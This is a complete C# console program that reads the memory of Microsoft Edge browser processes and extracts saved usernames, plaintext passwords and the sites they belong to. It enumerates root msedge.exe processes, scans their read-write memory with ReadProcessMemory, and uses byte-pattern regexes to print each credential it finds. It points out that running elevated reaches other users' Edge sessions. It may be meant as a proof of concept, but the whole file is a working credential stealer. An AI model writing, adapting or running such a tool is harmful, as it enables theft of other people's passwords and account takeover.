using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

internal class Program
{
    private const uint PROCESS_QUERY_INFORMATION = 0x0400;
    private const uint PROCESS_VM_READ = 0x0010;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_READWRITE = 0x04;

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    private class ProcessInfo
    {
        public int Id
        {
            get; set;
        }
        public string Name
        {
            get; set;
        }
        public string Owner
        {
            get; set;
        }
        public string CommandLine
        {
            get; set;
        }
    }

    private static string GetProcessOwnerFromToken(int pid)
    {
        var hProcess = OpenProcess(0x1000 /* QUERY_LIMITED_INFORMATION */, false, pid);
        if (hProcess == IntPtr.Zero)
        {
            return "UNKNOWN";
        }

        var hToken = IntPtr.Zero;
        if (!OpenProcessToken(hProcess, 8 /* TOKEN_QUERY */, out hToken))
        {
            return "UNKNOWN";
        }

        try
        {
            var wi = new WindowsIdentity(hToken);
            return wi.Name ?? "UNKNOWN";
        } catch
        {
            return "UNKNOWN";
        } finally
        {
            CloseHandle(hToken);
            CloseHandle(hProcess);
        }
    }

    private static void Main()
    {
        // Check if running elevated (admin)
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        var isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);

        if (!isElevated)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[x]");
            Console.ResetColor();
            Console.WriteLine(" Not running elevated.\n\nProgram will only be able to access Edge processes ran by the same user.");
            Console.WriteLine("The program might also fail trying to look up owner of some Edge processes.\n");
            //return; 
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[v]");
            Console.ResetColor();
            Console.WriteLine(" Running elevated.\n");
        }

        Console.Write("Fetching browser processes:");
        var totalMatches = 0;
        var shownMatches = 0;
        var alreadyCheckedUsers = new HashSet<string>();

        var searcher = new ManagementObjectSearcher(
            "SELECT ProcessId, Name, ParentProcessId FROM Win32_Process WHERE Name='msedge.exe'");

        var processList = new List<ProcessInfo>();

        foreach (var mo in searcher.Get().Cast<ManagementObject>())
        {
            var pid = Convert.ToInt32(mo["ProcessId"]);
            var parentPid = Convert.ToInt32(mo["ParentProcessId"]);

            var skip = false;

            // Check what process is parent 
            try
            {
                var parent = Process.GetProcessById(parentPid);
                if (parent.ProcessName.Equals("msedge", StringComparison.OrdinalIgnoreCase))
                {
                    skip = true;   // Parent is msedge.exe → skip this child process
                }
            } catch
            {
                // Parent may have exited → treat as root process
            }

            if (skip)
            {
                continue;
            }

            // The credentials are only stored at root/parent msedge.exe processes
            processList.Add(new ProcessInfo
            {
                Id = pid,
                Name = mo["Name"]?.ToString(),
                Owner = GetProcessOwnerFromToken(pid)
            });
        }

        Console.WriteLine(" Done.\n");


        var seenStrings = new HashSet<string>();
        foreach (var proc in processList)
        {
            if (alreadyCheckedUsers.Contains($"{proc.Owner} {proc.Name}"))
            {
                // Console.WriteLine($"SKIPPING process PID: {proc.Id} - Already checked.");
                continue;
            }

            var owner = proc.Owner.Replace("NSC\\t1_", "");
            Console.WriteLine($"Scanning process PID: {proc.Id}\tName: {proc.Name}\tOwner: {owner}");

            var processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, proc.Id);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to open process: {proc.Id} {proc.Name} {proc.Owner}");
                continue;
            }

            var address = IntPtr.Zero;
            MEMORY_BASIC_INFORMATION memInfo;

            while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf<MEMORY_BASIC_INFORMATION>()) != 0)
            {
                address = new IntPtr(memInfo.BaseAddress.ToInt64() + (long)memInfo.RegionSize);
                var readable = memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE;
                if (!readable)
                {
                    continue;
                }
                var buffer = new byte[(int)memInfo.RegionSize];
                IntPtr bytesRead;

                if (!ReadProcessMemory(processHandle, memInfo.BaseAddress, buffer, buffer.Length, out bytesRead))
                {
                    continue;
                }


                var utf8 = Encoding.UTF8.GetString(buffer);
                var lines = Regex.Split(utf8, @"\r\n|\r|\n");

                foreach (var line in lines)
                {
                    // Pattern for saved passwords - Notice \x20 og \x00 - this is the pattern to look for in memory
                    var pattern = @"[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\\-_\.@\?]{1,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40})\x20\x00";

                    var matches = Regex.Matches(line, pattern);

                    foreach (Match match in matches)
                    {
                        var username = match.Groups[1].Value;
                        var password = match.Groups[2].Value;
                        var potentialPattern = $"{username} : {password}";
                        var beforeUrlPatternCheck = shownMatches;

                        var urlPattern = $@"\x00\x00\x00([A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+)(https?)\x20{Regex.Escape(username)} {Regex.Escape(password)}";

                        // Find all URLs for this line
                        foreach (Match urlMatch in Regex.Matches(line, urlPattern)) // This could be done in the for loop above, but I had some issues 
                        {
                            var value = urlMatch.Groups[1].Value;
                            var combined = $"{potentialPattern} @{value}";
                            if (seenStrings.Contains(combined))
                            {
                                continue;
                            }
                            Console.WriteLine(combined);
                            seenStrings.Add(combined);

                            shownMatches++;
                            totalMatches++;
                        }
                        alreadyCheckedUsers.Add($"{proc.Owner} {proc.Name}");
                    }
                }
            }
            CloseHandle(processHandle);
        }
        seenStrings.Clear(); // Removes all items
        seenStrings = null;  // Removes reference, eligible for GC

        Console.WriteLine($"\nTotal matches found across all processes: {totalMatches}. {shownMatches} shown.");
    }
}